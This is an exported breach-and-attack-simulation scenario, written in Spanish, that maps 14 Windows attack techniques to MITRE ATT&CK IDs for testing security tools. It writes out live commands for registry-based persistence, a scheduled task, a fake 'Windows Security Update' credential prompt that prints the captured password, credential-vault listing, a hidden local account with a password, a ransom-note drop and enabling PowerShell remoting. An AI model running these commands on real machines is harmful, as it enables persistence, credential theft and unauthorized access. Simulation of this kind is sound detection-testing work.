# 2025-PA-P1-Windows-Baseline-v01

| | |
|---|---|
| **Status** | active |
| **Severity** | medium |
| **Target environment** | Windows |
| **Tags** | `windowsbaseline` · `preparacionactiva` · `2026` · `windows` |
| **Autor** | Enddy Emmanuel Figueroa Perez |
| **Creado** | 2026-06-02T23:26:22.611Z |
| **Actualizado** | 2026-06-03T16:27:24.506Z |

## Plataformas BAS donde está disponible

- **Scythe** · ID: `78af8952-4ef6-4dab-ae2f-44ef9a8f53d3` · [ver](https://zgv2zwxzy3.saas.scythe.io/test-library/78af8952-4ef6-4dab-ae2f-44ef9a8f53d3)

## Descripción

El escenario Windows Baseline P1 es una simulacion BAS desarrollada por el equipo de Respuesta a Incidentes de Devel Group, basada en tacticas, tecnicas y procedimientos (TTPs) comunmente observados en ataques reales contra sistemas Microsoft Windows. Este escenario integra un conjunto representativo de tecnicas utilizadas por actores maliciosos para comprometer estos entornos, con el proposito de evaluar la eficacia de las soluciones de seguridad en la deteccion, prevencion y respuesta ante actividades maliciosas, incluyendo la ejecucion y eliminacion de malware escrito en disco.

## Steps

### 1. Windows Management Instrumentation: T1047

**MITRE:** T1047

```cmd
cmd /c wmic useraccount get /ALL /format:csv
```

### 2. Office Application Startup: T1137

**MITRE:** T1137

```cmd
cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f
cmd /c mkdir %APPDATA%\Microsoft\Outlook\ >nul 2>&1
cmd /c echo "YXB0IGluc3RhbGwgbWltaWs=" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
```

### 3. Logon Script (Windows): T1037.001

**MITRE:** T1037.001

```cmd
cmd /c echo "echo Art "Logon Script" installer. >> wazuhlog.txt" > C:\Temp\art.bat
cmd /c REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "C:\Temp\art.bat" /f
```

### 4. Scheduled Task: T1053.005

**MITRE:** T1053.005

```
cmd /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 03:15
```

### 5. Local Groups: T1069.001

**MITRE:** T1069.001

```cmd
cmd /c net localgroup
cmd /c net localgroup "Administrators"
```

### 6. GUI Input Capture: T1056.002

**MITRE:** T1056.002

```powershell
Invoke-Command -ScriptBlock { $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); write-warning $cred.GetNetworkCredential().Password }
```

### 7. Service Stop: T1489

**MITRE:** T1489

```cmd
cmd /c net.exe stop spooler
```

### 8. Data Encrypted for Impact: T1486

**MITRE:** T1486

```cmd
cmd /c echo "Your files have been stolen from your network and encrypted with a strong algorithm. We work for money and are not associated with politics. All you need to do is contact us and pay." > README.txt
```

### 9. Service Execution: T1569.002

**MITRE:** T1569.002

```
cmd /c sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
```

### 10. Windows Credential Manager: T1555.004

**MITRE:** T1555.004

```cmd
cmd /c vaultcmd /listcreds:"Windows Credentials"
```

### 11. Local Account: T1136.001

**MITRE:** T1136.001

```cmd
cmd /c net user /add "defaultservice" "@Paasd34m1Js"
```

### 12. Network Service Discovery: T1046

**MITRE:** T1046

```powershell
Invoke-Command -ScriptBlock { Get-Service -Name "Remote Desktop Services", "Remote Desktop Configuration" }
```

### 13. Device Driver Discovery: T1652

**MITRE:** T1652

```powershell
Invoke-Command -ScriptBlock { driverquery /v /fo list; driverquery /si /fo list }
```

### 14. Windows Remote Management: T1021.006

**MITRE:** T1021.006

```powershell
Invoke-Command -ScriptBlock { Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami} }
```

---
_Exportado desde STRIKE — `windows-baseline-p1`_
